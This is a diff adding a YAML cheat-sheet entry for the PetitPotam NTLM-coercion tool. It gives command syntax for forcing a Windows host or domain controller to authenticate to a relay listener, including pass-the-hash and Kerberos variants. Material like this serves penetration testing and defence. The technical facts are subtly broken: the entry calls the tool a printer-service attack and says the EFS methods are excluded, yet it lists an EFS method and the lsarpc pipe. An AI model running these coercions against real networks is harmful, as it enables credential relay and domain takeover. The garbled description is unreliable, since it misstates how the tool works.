@@ -1,0 +1,74 @@
+name: petitpotam
+aliases:
+  - petitpotam.py
+category: active-directory
+homepage: https://github.com/ly4k/PetitPotam
+description: >-
+  Coerces NTLM authentication from a Windows host by calling a printer
+  service RPC function on it. The host connects back to a UNC path of your
+  choosing, which is how the technique reaches a listener such as Responder or
+  ntlmrelayx.
+notes: >-
+  A random method is chosen unless you pass -method. The target often needs no
+  credentials at all. Microsoft patched only the EFS variants, so those methods
+  are deliberately not implemented here. If the target is outside your trusted
+  intranet it may authenticate with a null session; using a NetBIOS or ADIDNS
+  name for the listener avoids that.
+commands:
+  - name: Coerce authentication
+    syntax: petitpotam.py -target <dc-ip> <path>
+    description: >-
+      Triggers the target to authenticate to the UNC path, which must point at
+      your listener.
+    tags: [rpc, relay, ntlm]
+    notes: >-
+      This is a documented interface only; synx never runs it for you and you
+      must be authorised on the target.
+  - name: Named host
+    syntax: petitpotam.py -target <host> <path>
+    description: Uses a NetBIOS or fully qualified name instead of an address, which avoids a null session.
+    tags: [rpc, relay]
+  - name: Specific method
+    syntax: petitpotam.py -debug -method AddUsersToFile <dc-ip> <path>
+    description: >-
+      Calls one named coercion method instead of a random one; the debug flag
+      shows which method was chosen.
+    tags: [rpc, relay]
+  - name: Choose the named pipe
+    syntax: petitpotam.py -pipe <pipe> <dc-ip> <path>
+    description: Selects the pipe to connect on; the default is lsarpc.
+    tags: [rpc]
+  - name: Destination port
+    syntax: petitpotam.py -port <port> <dc-ip> <path>
+    description: Changes the port used to reach the MS-RPRN named pipe.
+    tags: [rpc]
+  - name: Resolved target address
+    syntax: petitpotam.py -target-ip <dc-ip> -target <host> <path>
+    description: >-
+      Sets the address to connect to separately from the target name, which is
+      useful when the name cannot be resolved.
+    tags: [rpc]
+  - name: Authenticated coercion
+    syntax: petitpotam.py -hashes <lmhash>:<nthash> <dc-ip> <path>
+    description: Authenticates to the target with an NTLM hash in LM:NT form.
+    tags: [credentials, pass-the-hash]
+  - name: Kerberos authentication
+    syntax: petitpotam.py -k -target <host> <path>
+    description: >-
+      Uses the credential cache instead of command-line credentials, which keeps
+      the password out of the shell history.
+    tags: [credentials, kerberos]
+  - name: Domain controller address
+    syntax: petitpotam.py -target <host> -dc-ip <dc-ip> <path>
+    description: >-
+      Overrides the domain controller address; without it the domain part of the
+      target is used.
+    tags: [kerberos]
+  - name: Debug output
+    syntax: petitpotam.py -debug <dc-ip> <path>
+    description: Turns on debug logging to see the RPC conversation.
+    tags: [output, debug]
+  - name: Help
+    syntax: petitpotam.py -h
+    description: Lists every option and the available coercion methods.
+    tags: [help, reference]
